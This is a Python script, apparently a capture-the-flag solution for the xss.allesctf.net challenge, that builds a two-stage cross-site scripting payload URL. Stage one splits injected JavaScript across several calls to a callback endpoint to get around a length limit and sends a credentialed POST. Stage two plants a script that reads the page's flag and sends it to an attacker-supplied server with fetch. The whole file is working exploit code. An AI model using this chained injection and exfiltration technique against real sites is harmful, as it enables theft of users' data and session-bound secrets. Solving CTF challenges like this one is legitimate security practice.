import urllib.parse
import html

urlencode = urllib.parse.quote_plus  # just a helper

# this is the js we want to get executed on stage2
js_stage2 = "flag=document.getElementsByTagName('b')[0].innerText; fetch('//[your server here]/flag?f='+flag,{'mode':'no-cors'})"

tag_stage2 = f"<script>{js_stage2}</script>"

payload_stage2 = f"<span id=backgrounds>{html.escape(tag_stage2)}</span> <!--"

# the parameter for the post request
bkg_param = urlencode(f'innerText">{payload_stage2}')


# because the `http://xss.allesctf.net/items.php?cb=[script here]`
# has a limit on the length of the `cb` parameter we have to split
# the script into 3

# Part 1 and 2 build up a js variable `p` which contains `bkg_param`
# Part 3 makes the POST request with `p` (`bkg_param`) as the body
# and redirects to stage2
payload_stage1_p1 = f"p='bg={bkg_param[:200]}'"
payload_stage1_p2 = f"p+='{bkg_param[200:]}'"

payload_stage1_p3 = """
u=document.getElementById("stage2");
fetch(u,{
                headers:{'Content-type':'application/x-www-form-urlencoded'},
                method:"POST",
                credentials:"include",
                mode:"no-cors",
                body:p
});
debugger;
u.click()
"""
# generates a script tag for stage1 using
# `http://xss.allesctf.net/items.php?cb=[script here]`
def gen_script_tag(script):
        script = script.replace("\n","").replace("\t","") + "//"
        scriptUrl = f"/items.php?cb={urlencode(script)}"
        searchParam = f"<script src='{scriptUrl}'></script>"
        return urlencode(searchParam)

payload_url = f"http://xss.allesctf.net/?search={gen_script_tag(payload_stage1_p1)}{gen_script_tag(payload_stage1_p2)}{gen_script_tag(payload_stage1_p3)}"


print(payload_url)
